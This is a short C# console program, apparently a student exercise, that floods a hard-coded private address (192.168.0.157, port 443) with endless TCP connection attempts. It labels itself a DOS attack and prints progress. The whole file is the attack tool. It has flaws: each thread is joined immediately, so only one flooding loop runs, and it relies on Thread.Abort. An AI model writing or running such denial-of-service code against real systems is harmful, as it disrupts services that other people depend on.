using System.Net;
using System.Net.Sockets;

string student = "Adam Šárek (SAR0083)";
int threads = 1;
List<Thread> threadPool = new List<Thread>();
IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("192.168.0.157"), 443);
int clients = 0;

// Get available thread count
ThreadPool.GetAvailableThreads(out threads, out int io);

// Start Denial of Service
Console.Title = "Student: " + student + ", DOS Attack IP: " + endPoint + ", Threads: " + threads;
Console.WriteLine("Student: {0}, DOS Attack IP: {1}, Threads: {2}\n", student, endPoint, threads);
Start();
Console.ReadKey();
Stop();

void Start()
{
    for (int i = 0; i < threads; i++)
    {
        threadPool.Add(new Thread(Connect));
        threadPool[i].IsBackground = true;
        threadPool[i].Start();
        threadPool[i].Join();
    }
}

void Stop()
{
    foreach (Thread thread in threadPool)
    {
        thread.Abort();
    }
}

void Connect(object obj)
{
    while (true)
    {
        TcpClient tcpClient = new TcpClient();

        try
        {
            tcpClient.Connect(endPoint);
            clients++;
        }
        catch (Exception e)
        {
            Console.WriteLine("Clients: {0}, Error: {1}", clients, e.Message);
        }
    }
}